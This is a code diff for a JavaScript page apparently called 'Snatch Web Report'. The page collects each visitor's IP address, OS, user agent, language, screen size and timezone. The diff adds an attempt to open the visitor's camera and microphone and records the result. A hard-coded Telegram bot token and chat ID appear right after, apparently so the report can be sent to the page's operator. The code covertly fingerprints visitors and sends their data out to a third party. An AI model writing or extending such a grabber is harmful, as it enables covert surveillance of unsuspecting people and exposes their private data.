@@ -16,7 +16,17 @@
         time: new Date().toLocaleString()
       };
 
-      const msg = `📡 *Snatch Web Report*\n\n🌍 IP: ${data.ip}\n🖥️ OS: ${data.platform}\n📱 Agent: ${data.ua}\n🗺️ Lang: ${data.lang}\n📏 Screen: ${data.screen}\n🕒 Timezone: ${data.tz}\n⏰ Time: ${data.time}`;
+      // 🔥 المحاولة للوصول إلى الكاميرا والمايك
+      let camAccess = "❌ Blocked or Failed";
+      try {
+        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+        camAccess = "✅ Access Granted";
+      } catch (e) {
+        camAccess = "❌ " + e.name;
+      }
+
+      const msg = `📡 *Snatch Web Report*\n\n🌍 IP: ${data.ip}\n🖥️ OS: ${data.platform}\n📱 Agent: ${data.ua}\n🗺️ Lang: ${data.lang}\n📏 Screen: ${data.screen}\n🕒 Timezone: ${data.tz}\n⏰ Time: ${data.time}\n🎥 Camera/Mic: ${camAccess}`;
+
       const token = "7809696227:AAGk8fExoDKgW4xN5X7mhxQ7c7raA2_7uaw";
       const chat_id = "6991944640";
 
